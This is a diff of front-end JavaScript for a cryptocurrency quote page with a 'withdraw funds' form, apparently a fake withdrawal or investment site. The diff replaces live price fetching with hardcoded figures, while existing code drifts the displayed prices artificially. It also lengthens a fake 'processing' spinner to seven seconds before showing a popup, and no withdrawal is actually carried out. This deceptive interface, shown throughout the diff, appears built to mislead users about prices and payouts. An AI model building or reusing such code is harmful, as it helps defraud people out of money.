@@ -1,53 +1,59 @@
 /** FETCH **/
-const btc = document.getElementById('btc')
-const eth = document.getElementById('eth')
-const bnb = document.getElementById('bnb')
-const xrp = document.getElementById('xrp')
-const sol = document.getElementById('sol')
-let payload = null
-let gotPayloadTimes = 0
-fetch('/server.php')
-  .then(r => r.json())
-  .then(r => {
-    if (r.status === 'ERR') {
-      console.error('Error getting latest crypto quotes')
-      return
-    }
+// const btc = document.getElementById('btc')
+// const eth = document.getElementById('eth')
+// const bnb = document.getElementById('bnb')
+// const xrp = document.getElementById('xrp')
+// const sol = document.getElementById('sol')
+// let payload = null
+// let gotPayloadTimes = 0
+// fetch('/server.php')
+//   .then(r => r.json())
+//   .then(r => {
+//     if (r.status === 'ERR') {
+//       console.error('Error getting latest crypto quotes')
+//       document.querySelectorAll('.dol').forEach(i => i.classList.add('dol--active'))
+//       btc.innerText = '108,787.81'
+//       eth.innerText = '2,554.80'
+//       bnb.innerText = '674.14'
+//       xrp.innerText = '2.35'
+//       sol.innerText = '176.35'
+//       return
+//     }
 
-    gotPayloadTimes++
-    payload = r.payload
-    document.querySelectorAll('.dol').forEach(i => i.classList.add('dol--active'))
-    btc.innerText = r.payload.btc
-    eth.innerText = r.payload.eth
-    bnb.innerText = r.payload.bnb
-    xrp.innerText = r.payload.xrp
-    sol.innerText = r.payload.sol
-  })
+//     gotPayloadTimes++
+//     payload = r.payload
+//     document.querySelectorAll('.dol').forEach(i => i.classList.add('dol--active'))
+//     btc.innerText = r.payload.btc
+//     eth.innerText = r.payload.eth
+//     bnb.innerText = r.payload.bnb
+//     xrp.innerText = r.payload.xrp
+//     sol.innerText = r.payload.sol
+//   })
 
-setInterval(() => {
-  btc.innerText = formatWithCommas(doMathBtc(payload.btc))
-  eth.innerText = formatWithCommas(doMathEth(payload.eth))
-  bnb.innerText = formatWithCommas(doMathEth(payload.bnb))
-}, 3500)
-setInterval(() => {
-  if (gotPayloadTimes === 2) return
-  fetch('/server.php')
-    .then(r => r.json())
-    .then(r => {
-      if (r.status === 'ERR') {
-        console.error('Error getting latest crypto quotes')
-        return
-      }
+// setInterval(() => {
+//   btc.innerText = formatWithCommas(doMathBtc(payload.btc))
+//   eth.innerText = formatWithCommas(doMathEth(payload.eth))
+//   bnb.innerText = formatWithCommas(doMathEth(payload.bnb))
+// }, 3500)
+// setInterval(() => {
+//   if (gotPayloadTimes === 2) return
+//   fetch('/server.php')
+//     .then(r => r.json())
+//     .then(r => {
+//       if (r.status === 'ERR') {
+//         console.error('Error getting latest crypto quotes')
+//         return
+//       }
 
-      gotPayloadTimes++
-      payload = r.payload
-      btc.innerText = r.payload.btc
-      eth.innerText = r.payload.eth
-      bnb.innerText = r.payload.bnb
-      xrp.innerText = r.payload.xrp
-      sol.innerText = r.payload.sol
-    })
-}, 32000)
+//       gotPayloadTimes++
+//       payload = r.payload
+//       btc.innerText = r.payload.btc
+//       eth.innerText = r.payload.eth
+//       bnb.innerText = r.payload.bnb
+//       xrp.innerText = r.payload.xrp
+//       sol.innerText = r.payload.sol
+//     })
+// }, 62000)
 
 let lastHistoryState = history.state;
 window.addEventListener('popstate', (e) => {
@@ -202,6 +208,7 @@ form.onsubmit = (e) => {
 
   btnSubmit.style.padding = '5px 10px'
   btnSubmit.disabled = true
+  btnSubmit.classList.add('btn-submit--processing')
   btnSubmitInnerText.innerHTML = '<span class="spinner"></span>'
   setTimeout(() => {
     overlay.classList.add('overlay--db')
@@ -211,7 +218,7 @@ form.onsubmit = (e) => {
     void popup.offsetWidth
     popup.classList.add('popup--active')
     disableScrollEvents()
-  }, 650)
+  }, 7000)
 }
 agreed.addEventListener('change', function() {
   agreedRow.classList.remove('form__row--bad')
@@ -229,6 +236,7 @@ closeBtn.onclick = () => {
   popup.classList.remove('popup--active')
   btnSubmit.style.padding = '10px'
   btnSubmitInnerText.innerHTML = 'Вывести средства'
+  btnSubmit.classList.remove('btn-submit--processing')
   btnSubmit.disabled = false
   enableScrollEvents()
 }
@@ -239,6 +247,7 @@ overlay.onclick = () => {
   popup.classList.remove('popup--active')
   btnSubmit.style.padding = '10px'
   btnSubmitInnerText.innerHTML = 'Вывести средства'
+  btnSubmit.classList.remove('btn-submit--processing')
   btnSubmit.disabled = false
   enableScrollEvents()
 }
